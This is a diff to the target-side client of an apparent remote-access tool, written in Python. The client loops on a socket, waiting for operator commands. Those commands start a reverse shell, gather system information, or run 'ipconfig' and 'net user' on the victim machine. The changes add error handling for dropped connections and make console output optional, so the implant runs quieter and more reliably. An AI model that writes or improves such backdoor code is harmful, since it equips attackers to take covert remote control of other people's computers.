@@ -107,25 +107,31 @@ class Target(Machine):
 
     def what_to_do(self):
         while True:
-            instruction = self.s.recv(self.buffer)
-            instruction = instruction.decode("utf-8")
-            if instruction == "quit":
+            try:
+                instruction = self.s.recv(self.buffer)
+                instruction = instruction.decode("utf-8")
+                if instruction == "quit":
+                    if self.print:
+                        print("Leave the programme... Bye")
+                    self.quit()
+                    break
+                elif instruction == "print_target_True":
+                    self.print = True
+                elif instruction == "print_target_False":
+                    self.print = False
+                elif instruction == "shell":
+                    self.reverse_shell_target()
+                elif instruction == "getinfo_generality":
+                    self.getinfo_target_generality()
+                elif instruction == "ipconfig" or instruction == "net user":
+                    self.getinfo_target_cmd(instruction)
+                elif instruction == "buffer_size":
+                    self.change_buffer_size()
+            except ConnectionResetError as msg:
                 if self.print:
-                    print("Leave the programme... Bye")
+                    print("Error : " + msg)
                 self.quit()
-                break
-            elif instruction == "print_target_True":
-                self.print = True
-            elif instruction == "print_target_False":
-                self.print = False
-            elif instruction == "shell":
-                self.reverse_shell_target()
-            elif instruction == "getinfo_generality":
-                self.getinfo_target_generality()
-            elif instruction == "ipconfig" or instruction == "net user":
-                self.getinfo_target_cmd(instruction)
-            elif instruction == "buffer_size":
-                self.change_buffer_size()
+
 
     def reverse_shell_target(self):
         while True:
@@ -186,11 +192,16 @@ class Target(Machine):
 
     # close de connection and the socket
     def quit(self):
-        self.s.send(str.encode("The connection is closing. Say bye to \n\tIP: " + self.information[0]
-                               + " \n\tPort " + str(self.information[1])))
         try:
+            self.s.send(str.encode("The connection is closing. Say bye to \n\tIP: " + self.information[0] + " \n\tPort "
+                                   + str(self.information[1])))
             super().quit()
         except socket.error as msg:
-            print("the socket fail to close : " + str(msg))
+            if self.print:
+                print("the socket fail to close : " + str(msg))
+        except ConnectionResetError as msg:
+            if self.print:
+                print("The connection has already been stopped")
+            super().quit()
 
 
